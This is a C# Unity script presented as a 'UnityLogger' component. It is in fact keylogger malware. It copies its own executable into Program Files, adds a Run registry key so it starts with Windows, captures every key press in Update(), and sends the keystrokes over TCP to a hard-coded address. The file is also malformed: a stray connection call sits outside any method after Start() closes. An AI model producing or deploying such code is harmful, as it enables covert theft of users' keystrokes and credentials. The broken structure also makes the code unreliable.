using System.Text;
using System.Net.Sockets;
using System.Threading.Tasks;
using UnityEngine;
using Microsoft.Win32;
using System.IO;
using System.Reflection;
using System;

public class UnityLogger : MonoBehaviour
{
    private StringBuilder _keylogs = new StringBuilder();
    private TcpClient _client;
    private NetworkStream _stream;
    private bool _isConnected = false;

    void Start()
    {
        // Step 1: Get the path of the currently running executable
        string currentExePath = Assembly.GetExecutingAssembly().Location;

        // Step 2: Define the target path in the Program Files folder
        string programFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        string targetPath = Path.Combine(programFilesPath, "MyApp", "MyAppCopy.exe");

        // Step 3: Ensure the directory exists in Program Files
        Directory.CreateDirectory(Path.GetDirectoryName(targetPath));

        try
        {
            // Step 4: Copy the executable to the Program Files folder
            File.Copy(currentExePath, targetPath, true);
            Console.WriteLine("Executable copied to: " + targetPath);

            // Step 5: Set up the registry key for persistence
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
            {
                if (key != null)
                {
                    key.SetValue("MyApp", targetPath);
                    Console.WriteLine("Registry key set to run on startup.");
                }
                else
                {
                    Console.WriteLine("Failed to open registry key.");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
    }

        ConnectToServer("192.168.178.22", 5555);
    }

    void Update()
    {
        foreach (KeyCode keycode in System.Enum.GetValues(typeof(KeyCode)))
        {
            if (Input.GetKeyDown(keycode))
            {
                _keylogs.Append(keycode.ToString() + " ");


                if (_isConnected)
                {
                    SendKeylog(_keylogs.ToString());
                    _keylogs.Clear();
                }
            }
        }
    }

    private async void ConnectToServer(string ip, int port)
    {
        try
        {
            _client = new TcpClient(ip, port);
            _stream = _client.GetStream();
            _isConnected = true;
            Debug.Log("Connected to server");
        }
        catch (System.Exception ex)
        {
            Debug.LogError($"Failed to connect to server: {ex.Message}");
        }
    }

    private void OnApplicationQuit()
    {
        _stream?.Close();
        _client?.Close();
    }

    
}